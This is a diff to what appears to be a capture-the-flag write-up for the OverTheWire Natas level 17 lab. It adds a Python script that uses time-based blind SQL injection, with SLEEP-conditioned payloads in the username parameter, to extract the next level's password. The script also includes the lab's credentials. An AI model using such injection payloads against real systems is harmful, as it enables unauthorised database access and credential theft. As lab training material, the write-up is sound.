@@ -59,25 +59,38 @@ read: "https://owasp.org/www-community/attacks/Blind_SQL_Injection" time-based p
 import requests
 import time
 
-url = "http://natas17.natas.labs.overthewire.org/index.php"
+url = "http://natas17.natas.labs.overthewire.org"
 auth = ("natas17", "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC")
 characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+cset = ""
+for char in characters:
+    payload = f'natas18" AND IF(password LIKE BINARY "%{char}%", SLEEP(15), 0) -- '
+    start_time = time.time()
+
+    response = requests.get(url, params={"username": payload}, auth=auth)
+
+    elapsed_time = time.time() - start_time
+    if elapsed_time > 15:  
+        cset += char
+print(f"Charset: {cset}")
+
 password = ""
-
-while len(password) < 32: 
-    for char in characters:
-        payload = f'natas18" AND IF(password LIKE BINARY "{password + char}%", SLEEP(2), 0) -- '
-        start_time = time.time()
-
-        response = requests.get(url, params={"username": payload}, auth=auth)
-
-        elapsed_time = time.time() - start_time
-        if elapsed_time > 2:  # 
-            password += char
-            print(f"Current password: {password}")
-            break
+while len(password) != 32:
+	for c in cset:
+		t = password + c
+		username = 'natas18" AND IF(password LIKE BINARY "%s%%",SLEEP(%d), 1)#' % (t, 15)
+		r = requests.get(url, auth=auth, params={"username": username}
+		)
+		s = r.elapsed.total_seconds()
+		if s >= 15:
+			#print (t)
+			password = t
+			break
+print("password: ",password)
 ```
 <br>
+->Natas18<br>
+
 
 
 
